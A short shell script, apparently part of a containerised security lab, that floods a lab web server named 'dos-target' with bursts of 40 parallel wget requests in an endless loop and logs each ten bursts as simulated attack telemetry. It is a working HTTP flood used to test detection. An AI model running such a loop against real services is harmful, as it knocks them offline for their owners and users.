#!/bin/sh
# Lab-only HTTP load against dos-target. Tune parallelism in compose if needed.
apk add --no-cache wget >/dev/null || exit 1
. /lab-telemetry.sh
echo "[dos-attacker] waiting for web server..."
sleep 20
echo "[dos-attacker] starting burst loop (local lab traffic only)"
c=0
while true; do
  i=0
  while [ "$i" -lt 40 ]; do
    wget -q -T 2 -O /dev/null "http://dos-target/" 2>/dev/null &
    i=$((i + 1))
  done
  wait || true
  c=$((c + 1))
  if [ $((c % 10)) -eq 0 ]; then
    lab_ssh_brute_event LAB_HTTP_FLOOD 10 1100
  fi
  sleep 2
done
